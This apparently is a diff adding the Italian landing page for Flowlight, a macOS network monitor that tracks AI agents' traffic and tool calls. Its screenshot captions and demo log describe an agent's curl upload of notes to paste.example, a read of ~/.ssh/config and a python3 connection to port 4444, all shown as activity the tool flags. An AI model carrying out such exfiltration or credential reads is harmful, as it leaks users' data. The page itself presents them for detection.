+<section class="band" id="inspect">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">Ispezione HTTPS · opzionale</p>
+        <h2>Collega le chiamate agli strumenti supportate alle richieste di rete</h2>
+        <p class="lede">Disattivata per impostazione predefinita. Se la attivi, Flowlight diventa un proxy locale con una propria autorità di certificazione, creata
+          sul tuo Mac. Avvia un agente da un Terminale ispezionato e il traffico HTTP supportato dell'agente e dei suoi strumenti viene decifrato, con le chiamate agli strumenti
+          richieste dal modello e i risultati tornati indietro.</p>
+      </div>
+      <figure class="detail-shot"><div class="frame"><img src="../assets/screenshots/inspect.png?v=4a7a2ce7" width="1600" height="1075" loading="lazy"
+        alt="La vista Ispeziona di Flowlight: un elenco di richieste decifrate di Claude Code con le loro chiamate agli strumenti e il dettaglio del caricamento di curl verso paste.example, prodotto dalla chiamata allo strumento Bash che lo ha eseguito, con le note caricate nel corpo della richiesta"></div>
+        <figcaption><b>Dove sono finite le mie note?</b> Il caricamento di curl verso paste.example, risalendo al comando Bash richiesto dal modello, con il
+          corpo che ha inviato.</figcaption></figure>
+      <div class="screens" style="margin-top:32px">
+        <figure><div class="frame"><img src="../assets/screenshots/agent-tools.png?v=2dd743f6" width="1600" height="622" loading="lazy"
+          alt="Il pannello Strumenti per Claude Code: Bash, Read e due strumenti MCP con le descrizioni e quante volte il modello ha chiamato ciascuno"></div>
+          <figcaption><b>Ogni strumento che un agente offre al modello.</b> Gli agenti dichiarano i loro strumenti a ogni turno, così Flowlight li elenca tutti, indicando
+            quelli che il modello ha davvero usato e quelli che non ha mai toccato.</figcaption></figure>
+        <figure><div class="frame"><img src="../assets/screenshots/mcp-servers.png?v=0e34adfb" width="1600" height="622" loading="lazy"
+          alt="Il pannello Server MCP per Codex: un server sentry contrassegnato come «tramite provider», il suo URL, approvazione impostata su «mai», gli strumenti consentiti e quelli che offre"></div>
+          <figcaption><b>Compresi quelli che non vedi passare in rete.</b> Quando un agente chiede al provider di collegarsi a un server MCP, quel traffico
+            non arriva mai al tuo Mac. La sua richiesta sì, così il server, il suo URL, la sua impostazione di approvazione e i suoi strumenti compaiono comunque.</figcaption></figure>
+      </div>
+      <div class="privacy" style="margin-top:32px">
+        <div><strong>Chiamate agli strumenti e risultati</strong><p>Anthropic, OpenAI, Gemini e MCP. Ogni chiamata con il suo comando, il suo output o errore e le richieste fatte dal suo strumento.</p></div>
+        <div><strong>Modelli e token</strong><p>Quale modello ha risposto, quante chiamate e i token in entrata, in uscita e serviti dalla cache, per ogni agente.</p></div>
+        <div><strong>Corpi leggibili</strong><p>JSON come albero espandibile nell'ordine originale, gli stream un evento alla volta, intestazioni e vista testo.</p></div>
+        <div><strong>Sotto controllo esplicito</strong><p>Per impostazione predefinita l'ispezione riguarda gli agenti IA. Flowlight esclude il proprio elenco integrato di servizi Apple e gestori di password, oscura le intestazioni con le credenziali prima di memorizzarle e offre un'unica azione per rimuovere il certificato e i dati registrati.</p></div>
+      </div>
+    </div>
+  </section>
+
+<section class="band" id="roadmap">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">Prossimi passi</p>
+        <h2>Cosa arriva</h2>
+        <p class="lede">Oggi Flowlight osserva, spiega e rifiuta. Questo è l'ordine in cui viene costruito il resto.</p>
+      </div>
+      <div class="privacy">
+        <div><strong>Prima Linux, poi Windows</strong><p>Il nucleo di analisi è Swift portabile; l'acquisizione no. Arriva prima un daemon Linux con un'interfaccia web locale, basato su eBPF invece che sulle API di macOS.</p></div>
+      </div>
+    </div>
+  </section>
+
+<section class="band" id="privacy">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">Privacy</p>
+        <h2>Un monitoraggio che non devi monitorare</h2>
+      </div>
+      <div class="privacy">
+        <div><strong>Resta sul tuo Mac</strong><p>Un solo file SQLite locale. Nessun account, nessuna sincronizzazione nel cloud, nessuna telemetria.</p></div>
+        <div><strong>Metadati, per impostazione predefinita</strong><p>Nomi host, porte e byte conteggiati. Decifrare HTTPS è una modalità separata che devi attivare tu, e resta sul tuo Mac.</p></div>
+        <div><strong>Filtrato nel kernel</strong><p>L'acquisizione lascia passare solo le risposte DNS e i ClientHello TLS. Tutto il resto viene scartato prima che Flowlight lo veda.</p></div>
+        <div><strong>Ricerche che controlli tu</strong><p>Per dare un nome al proprietario di un indirizzo vengono inviati a Team Cymru solo gli IP pubblici senza nome host, e si disattiva con un clic. Il controllo giornaliero degli aggiornamenti chiede a GitHub solo l'ultima versione, e anche quello si può disattivare.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="agent-detail" aria-label="Schermata del dettaglio di un agente">
+    <div class="wrap">
+      <figure class="detail-shot"><div class="frame"><img src="../assets/screenshots/agent-detail.png?v=d9dd8e0f" width="1600" height="622" loading="lazy"
+        alt="Il dettaglio di Claude Code in Flowlight: strumenti e server MCP con il numero di chiamate e un errore, un elenco consentiti e il pannello Chiamate agli strumenti con un git push fallito, un caricamento curl verso paste.example con la sua risposta e la sua richiesta, npm install, un issue su GitHub, una ricerca nella documentazione e la lettura di un file, ciascuno con il proprio risultato"></div>
+        <figcaption><b>Un agente, tutte le chiamate agli strumenti.</b> Il traffico di git, curl e dei server MCP avviati da Claude Code conta come traffico di Claude Code.
+          Con l'ispezione HTTPS attiva, il pannello <em>Chiamate agli strumenti</em> mostra che cosa ha chiesto il modello, che cosa è tornato indietro e le richieste fatte da ogni strumento:
+          il caricamento curl verso paste.example e il git push fallito.</figcaption></figure>
+    </div>
+  </section>
+
+  <section class="band" aria-label="Altre schermate">
+    <div class="wrap screens">
+      <figure><div class="frame"><img src="../assets/screenshots/reports.png?v=dafc9b18" width="1600" height="1075" loading="lazy"
+        alt="La vista Rapporti con le barre orarie dei dati ricevuti e inviati e i grafici ad anello di app, destinazioni e protocolli"></div>
+        <figcaption><b>Rapporti.</b> Zoom dal secondo all'anno, tre raggruppamenti, grafici che restano leggibili con centinaia di app.</figcaption></figure>
+      <figure><div class="frame"><img src="../assets/screenshots/alerts.png?v=b61d6fd7" width="1600" height="1075" loading="lazy"
+        alt="La vista Avvisi con avvisi di esfiltrazione da parte di un agente, e-mail, FTP, attività mentre sei via e picco di traffico"></div>
+        <figcaption><b>Avvisi.</b> Ognuno indica l'app, la destinazione e il numero che lo ha fatto scattare.</figcaption></figure>
+    </div>
+  </section>
+
+  <section class="band" id="install">
+    <div class="wrap install">
+      <div class="section-head" style="margin:0">
+        <p class="eyebrow">Installazione</p>
+        <h2>In funzione in meno di un minuto</h2>
+        <ol class="steps" style="margin-top:16px">
+          <li><div><strong>Scarica Flowlight.dmg</strong><p>Aprilo e trascina Flowlight in Applicazioni. Con ogni versione è disponibile anche un <a href="https://github.com/xinbetween/flowlight/releases/latest">installer .pkg</a>. Le versioni sono firmate con un certificato Developer ID e autenticate da Apple.</p></div></li>
+          <li><div><strong>Avvialo</strong><p>Il traffico compare entro un secondo e le velocità ↓↑ in diretta restano nella barra dei menu.</p></div></li>
+          <li><div><strong>Dai un nome al traffico</strong><p>Approva la configurazione iniziale (la tua password, una volta sola) perché Flowlight possa leggere i nomi host.</p></div></li>
+        </ol>
+      </div>
+      <div style="display:grid;gap:14px">
+        <p style="color:var(--muted)">Preferisci compilarlo da te, o dare prima un'occhiata con dati di esempio?</p>
+<pre><span class="c"># build from source (Xcode 16+, no Apple account needed)</span>
+brew install xcodegen
+git clone https://github.com/xinbetween/flowlight.git
+cd flowlight &amp;&amp; xcodegen generate
+scripts/build-local.sh
+
+<span class="c"># explore with 90 days of synthetic traffic</span>
+open Flowlight.app --args -FLDemo YES</pre>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="faq">
+    <div class="wrap">
+      <div class="section-head"><p class="eyebrow">FAQ</p><h2>Domande</h2></div>
+      <div class="faq">
+        <details><summary>Flowlight blocca il traffico?</summary>
+          <p>Per impostazione predefinita osserva e avvisa, anche quando un agente esce dal suo elenco consentiti. Può anche rifiutare quelle connessioni,
+            ma solo per un agente per cui hai attivato questa opzione, e solo con il motore dell'estensione di rete installato: il campionatore può
+            soltanto osservare. Il traffico locale, il DNS, i servizi Apple e le connessioni di Flowlight non vengono mai rifiutati.</p></details>
+        <details><summary>Può leggere il mio traffico HTTPS?</summary>
+          <p>Non per impostazione predefinita. Legge il nome host che un client chiede quando apre una connessione (SNI di TLS) e le risposte DNS
+            che associano i nomi agli indirizzi, mentre i contenuti restano cifrati. Se vuoi il quadro completo, l'<strong>ispezione HTTPS</strong> è una
+            modalità separata, da attivare: Flowlight diventa un proxy locale con una propria autorità di certificazione e decifra le app che instradi
+            attraverso di esso (solo gli agenti IA, per impostazione predefinita), comprese tutte le chiamate agli strumenti che un modello chiede a un agente di eseguire. Le app che applicano il pinning
+            dei certificati possono rifiutarlo. Flowlight esclude dall'ispezione il proprio elenco integrato di servizi Apple e gestori di password.</p></details>
+        <details><summary>In che cosa è diverso da Little Snitch o LuLu?</summary>
+          <p>Quelli sono firewall che ti chiedono di consentire le connessioni. Flowlight è uno strumento di analisi: cronologia a qualsiasi livello di zoom,
+            linee di base per le anomalie e regole pensate per gli agenti IA. Convivono bene.</p></details>
+        <details><summary>Perché mi chiede la password?</summary>
+          <p>macOS permette di leggere i pacchetti di rete solo agli amministratori. La configurazione iniziale dà al tuo account l'accesso in lettura,
+            esattamente come fa Wireshark. Puoi revocarlo quando vuoi dalla schermata Acquisizione.</p></details>
+        <details><summary>Può dire quale server MCP o quale strumento ha fatto una richiesta?</summary>
+          <p>Sì, a livello di processo. Flowlight risale da ogni processo all'agente che lo ha avviato, così il curl di uno strumento shell
+            o le connessioni di un server MCP vengono attribuite a quell'agente, e i server MCP prendono il nome dalle configurazioni di Claude Code, Claude
+            Desktop, Cursor, Windsurf, VS Code, Codex, Zed e Gemini CLI. Non può sapere quale singola chiamata a uno strumento, dentro un server di
+            lunga durata, abbia aperto una connessione.</p></details>
+        <details><summary>Un elenco consentiti blocca il traffico?</summary>
+          <p>Per impostazione predefinita un elenco consentiti segnala le violazioni. Quando l'estensione di rete è attiva, puoi abilitarne l'applicazione per un agente, così le destinazioni non elencate vengono rifiutate. Il campionatore nettop può segnalare le violazioni ma non può bloccare le connessioni.</p></details>
+        <details><summary>Quali agenti riconosce?</summary>
+          <p>Claude Code, Codex, Cursor, Windsurf, GitHub Copilot, Gemini CLI, Aider, Goose, OpenCode, Ollama, LM Studio,
+            ChatGPT, Claude, Zed, Perplexity e ZCode, più qualsiasi processo non browser che chiami un'API LLM nota. Aggiungerne uno è una
+            pull request di una riga.</p></details>
+        <details><summary>Come si aggiorna?</summary>
+          <p>Una volta al giorno Flowlight chiede a GitHub l'ultima versione. Se c'è, mostra le note e può scaricare l'immagine
+            disco, verificarla con lo SHA-256 pubblicato e aprirla. Puoi disattivare il controllo in Impostazioni.</p></details>
+        <details><summary>È davvero gratuito?</summary>
+          <p>Sì. È software libero sotto licenza GPL-3.0: nessun piano a pagamento, nessuna raccolta di dati.</p></details>
+      </div>
+    </div>
+  </section>
+
+
+  <section class="final">
+    <div class="wrap">
+      <h2>Sappi che cosa esce dal tuo Mac.</h2>
+      <p class="lede">Software libero per macOS 15 e successivi.</p>
+      <div class="cta">
+        <a class="btn btn-primary" href="https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg">Scarica per macOS</a>
+        <a class="btn btn-ghost" href="https://github.com/xinbetween/flowlight">Vedi il codice sorgente</a>
+        <p class="brew"><code>brew install --cask xinbetween/tap/flowlight</code><button type="button" class="copy" data-copy="brew install --cask xinbetween/tap/flowlight">Copia</button></p>
+      </div>
+    </div>
+  </section>
+
+</main>
+<script>
+  // Stream new lines into the connection log. The full log is readable at rest.
+  //
+  // The feed is a tour of what Flowlight does now: traffic and alerts, but also a refusal, a guardrail taking a
+  // tool away before the model is offered it, a mocked answer, peer-to-peer Wi-Fi, a device arriving, and a tool
+  // call tied to the request it caused.
+  (function () {
+    var log = document.getElementById("log");
+    if (!log || window.matchMedia("(prefers-reduced-motion: reduce)").matches) return;
+    var feed = [
+      { app: "Chrome", dest: "github.com", proto: "https:443", dir: "down", bytes: "↓ 640 KB" },
+      { app: "codex", dest: "api.openai.com", proto: "https:443", dir: "up", bytes: "↑ 900 KB" },
+      { kind: "tool", note: "↳ Read: ~/.ssh/config — nessuna chiamata di rete" },
+      { app: "claude", dest: "registry.npmjs.org", proto: "https:443", dir: "down", bytes: "↓ 300 KB" },
+      { app: "claude › node", dest: "registry.npmjs.org", proto: "https:443", dir: "up", bytes: "rifiutata",
+        kind: "block", note: "⛔ regola «niente installazioni di pacchetti dopo le 18:00»" },
+      { app: "zoom.us", dest: "zoom.us", proto: "zoom-media:8801", dir: "down", bytes: "↓ 6.1 MB" },
+      { kind: "device", note: "● Backup Drive collegato · USB · 2 TB" },
+      { app: "python3", dest: "203.0.113.45", proto: "tcp:4444", dir: "up", bytes: "↑ 40 KB",
+        kind: "flag", note: "⚠ l'agente ha contattato un host senza nome" },
+      { app: "rapportd", dest: "Continuity · dispositivo vicino", proto: "llw0", dir: "down", bytes: "↓ 310 KB", kind: "p2p" },
+      { app: "claude", dest: "mcp.github.com", proto: "tools/call", dir: "down", bytes: "isError",
+        kind: "guard", note: "🛡 protezione: create_issue rifiutato, al modello è stato spiegato perché" },
+      { app: "Safari", dest: "en.wikipedia.org", proto: "https:443", dir: "down", bytes: "↓ 250 KB" },
+      { app: "claude", dest: "github.com", proto: "ssh:22", dir: "up", bytes: "↑ 30 KB",
+        kind: "flag", note: "⚠ l'agente ha aperto una sessione SSH" },
+      { app: "Flowlight", dest: "127.0.0.1", proto: "ollama:11434", dir: "up", bytes: "↑ 2 KB",
+        kind: "ask", note: "≡ Chiedi: risposta su questo Mac, nulla inviato" },
+      { app: "sharingd", dest: "AirDrop · dispositivo vicino", proto: "awdl0", dir: "up", bytes: "↑ 820 MB", kind: "p2p" },
+      { app: "iCloud", dest: "p45-content.icloud.com", proto: "https:443", dir: "up", bytes: "↑ 700 KB" },
+      { app: "Cursor", dest: "api2.cursor.sh", proto: "POST /v1/chat", dir: "down", bytes: "503",
+        kind: "mock", note: "✎ risposta di Flowlight, mai inoltrata" },
+    ];
+    var i = 0;
+    function line(r) {
+      var li = document.createElement("li");
+      li.className = ["enter", r.kind || ""].join(" ").trim();
+      // A row with no destination is an event rather than a connection: a tool call, a device arriving.
+      if (!r.dest) {
+        li.innerHTML = '<span class="app"></span><span class="note"></span>';
+        li.querySelector(".note").textContent = r.note;
+        return li;
+      }
+      li.innerHTML = '<span class="app"></span><span class="dest"><b></b> · <i></i></span>' +
+        '<span class="bytes ' + (r.dir || "") + '"></span>' + (r.note ? '<span class="note"></span>' : "");
+      li.querySelector(".app").textContent = r.app;
+      li.querySelector(".dest b").textContent = r.dest;
+      var proto = li.querySelector(".dest i");
+      proto.textContent = r.proto;
+      proto.style.fontStyle = "normal";
+      li.querySelector(".bytes").textContent = r.bytes;
+      if (r.note) li.querySelector(".note").textContent = r.note;
+      return li;
+    }
+    setInterval(function () {
+      log.insertBefore(line(feed[i++ % feed.length]), log.firstChild);
+      while (log.children.length > 12) log.removeChild(log.lastChild);
+    }, 1900);
+  })();
+</script>
+<footer class="site-footer">
+  <div class="wrap">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a class="brand" href="../it/"><img src="../assets/icon.png" alt="">Flowlight</a>
+        <p>Monitoraggio di rete app per app su macOS, con lo sguardo più attento sugli agenti IA.</p>
+      </div>
+      <div><h4>Prodotto</h4><ul>
+        <li><a href="https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg">Scarica per macOS</a></li>
+        <li><a href="../it/docs/#install">Installa con Homebrew</a></li>
+        <li><a href="../releases/">Note di rilascio</a></li>
+        <li><a href="../it/docs/">Documentazione</a></li>
+      </ul></div>
+      <div><h4>Progetto</h4><ul>
+        <li><a href="https://github.com/xinbetween/flowlight">Codice sorgente</a></li>
+        <li><a href="https://github.com/xinbetween/flowlight/blob/main/CONTRIBUTING.md">Contribuire</a></li>
+        <li><a href="https://github.com/xinbetween/flowlight/issues">Segnala un problema</a></li>
+      </ul></div>
+      <div><h4>Fiducia</h4><ul>
+        <li><a href="../it/privacy/">Privacy</a></li>
+        <li><a href="https://github.com/xinbetween/flowlight/blob/main/LICENSE">Licenza (GPL-3.0)</a></li>
+        <li><a href="../it/about/">Informazioni</a></li>
+      </ul></div>
+      <div><h4>Per gli agenti IA</h4><ul>
+        <li><a href="../llms.txt">llms.txt</a></li>
+        <li><a href="../llms-full.txt">llms-full.txt</a></li>
+        <li><a href="../sitemap.xml">Mappa del sito</a></li>
+      </ul></div>
+    </div>
+    <div class="legal">
+      <span>© 2026 Chi contribuisce a Flowlight. Flowlight è software libero, distribuito sotto la <a href="https://github.com/xinbetween/flowlight/blob/main/LICENSE">GNU General Public License v3.0</a>.</span>
+      <span>Versione 0.7.7 · Non affiliato ad Apple né ad alcun fornitore di IA citato in questo sito.</span>
+    </div>
+  </div>
+</footer>
+<script>
+  // Copy buttons for the install command. Falls back to selecting the text when the clipboard isn't available.
+  document.querySelectorAll("button.copy").forEach(function (button) {
+    button.addEventListener("click", function () {
+      var done = function () {
+        button.textContent = "Copiato";
+        button.setAttribute("data-copied", "");
+        setTimeout(function () { button.textContent = "Copia"; button.removeAttribute("data-copied"); }, 1600);
+      };
+      var text = button.getAttribute("data-copy");
+      if (navigator.clipboard) { navigator.clipboard.writeText(text).then(done, select); } else { select(); }
+      function select() {
+        var range = document.createRange();
+        range.selectNodeContents(button.parentNode.querySelector("code"));
+        var selection = getSelection();
+        selection.removeAllRanges();
+        selection.addRange(range);
+      }
+    });
+  });
+
+  // The table of contents starts collapsed on a phone. It is marked open in the markup so that without
+  // JavaScript — or on a desktop, where the summary is hidden — it is simply a list.
+  (function () {
+    var sheet = document.querySelector(".toc-sheet");
+    if (sheet && matchMedia("(max-width: 900px)").matches) sheet.removeAttribute("open");
+  })();
+
+  // Sections reveal as they come into view — once each, never on the way back up, and never for anyone who has
+  // asked for less motion. Without IntersectionObserver nothing is hidden in the first place, so the page reads
+  // exactly the same.
+  (function () {
+    var reduced = matchMedia("(prefers-reduced-motion: reduce)");
+    if (reduced.matches || !("IntersectionObserver" in window)) return;
+    var targets = document.querySelectorAll("section.band > .wrap, .shot .wrap, .final .wrap");
+    if (!targets.length) return;
+    var observer = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (!entry.isIntersecting) return;
+        entry.target.classList.add("shown");
+        observer.unobserve(entry.target);
+      });
+    }, { rootMargin: "0px 0px -8% 0px", threshold: 0.05 });
+    targets.forEach(function (target) {
+      target.classList.add("reveal");
+      observer.observe(target);
+    });
+  })();
+
+  // The language menu closes when the pointer goes elsewhere, the way a menu should.
+  (function () {
+    var menu = document.querySelector("details.lang");
+    if (!menu) return;
+    document.addEventListener("click", function (event) {
+      if (menu.open && !menu.contains(event.target)) menu.open = false;
+    });
+    document.addEventListener("keydown", function (event) {
+      if (event.key === "Escape" && menu.open) { menu.open = false; menu.querySelector("summary").focus(); }
+    });
+  })();
+</script>
+
+</body>
+</html>
